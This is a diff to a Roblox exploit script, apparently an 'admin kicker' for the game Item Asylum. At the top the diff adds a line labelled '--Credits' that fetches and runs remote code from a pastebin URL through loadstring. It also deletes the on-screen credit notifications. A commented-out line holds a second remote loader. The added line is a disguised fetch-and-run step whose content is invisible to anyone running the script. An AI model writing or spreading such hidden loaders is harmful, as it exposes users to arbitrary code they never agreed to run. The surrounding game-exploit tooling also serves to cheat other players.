@@ -1,3 +1,6 @@
+--Credits
+loadstring(game:HttpGet('https://pastebin.com/raw/1TKY86pG'))()
+wait(5)
 --[[
 https://www.roblox.com/games/5670218884/IA
 loadstring(game:HttpGet('https://raw.githubusercontent.com/d7ltacat/scripts/main/IAKick.lua'))()
@@ -74,16 +77,3 @@ Players.PlayerAdded:Connect(Check)
 for _,Player in Players:GetPlayers() do
     Check(Player)
 end
-
-cg = game:GetService("StarterGui")
-cg:SetCore("SendNotification", {
-	Title = "Successfully loaded:";
-	Text = "Roblox and Item Asylum Admin Kicker";
-	Duration = 15;
-})
-
-cg:SetCore("SendNotification", {
-	Title = "Made by Amourousity";
-	Text = "and edited by D7ltaCat on github!";
-	Duration = 15;
-})
